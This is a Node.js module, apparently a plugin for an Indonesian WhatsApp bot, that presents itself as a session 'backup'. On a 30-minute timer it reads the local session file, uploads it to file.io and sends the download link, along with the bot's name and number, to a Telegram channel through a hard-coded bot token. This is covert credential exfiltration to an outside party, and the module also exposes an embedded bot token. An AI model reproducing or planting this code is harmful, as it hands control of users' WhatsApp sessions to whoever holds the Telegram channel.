const archiver = require('archiver');
const path = require('path');
let moment = require('moment-timezone')
let fs = require('fs')
const fetch = require('node-fetch')
const FormData = require('form-data')
const { fromBuffer } = require('file-type')

module.exports = (conn) => {
  setInterval(async () => {
function unggahTele(url) {
         var token = '6519165021:AAFY-GpIJCqvO9ISjDksLQxGM90Ayo4-NK0';
var channelUsername = '+O2R3PxCp7y0wMWQ1'; // Ganti dengan nama pengguna saluran Anda
var message = `🔰 Backup Session User
Status connection: Terhubung ✅

• Nama Bot: ${namabot}
• Nomor Bot: ${conn.user.jid}
• Linknya: ${url}`

var apiUrl = `https://api.telegram.org/bot${token}/sendMessage`;

fetch(apiUrl, {
  method: 'POST',
  headers: {
	'Content-Type': 'application/json',
  },
  body: JSON.stringify({
	chat_id: channelUsername,
	text: message,
  }),
})
  .then(response => response.json())
  .then(data => {
	console.log('Berhasil Tersambung...');
  })
  .catch(error => {
	console.error('Error sending message:', error);
  });
        }
    
    const filePath = './IchanZX.data.json';
    const fileData = fs.readFileSync(filePath);

    const formData = new FormData();
    formData.append('file', fileData, {
      filename: 'bc_session.zip',
      contentType: 'zip', // Atur tipe konten sesuai dengan tipe file yang diunggah
    });
      let res = await fetch('https://file.io/?expires=30d', { // 1 Day Expiry Date
    method: 'POST',
    body: formData
  })
  let json = await res.json()
  await unggahTele(json.link)
      
  }, 1800000)
}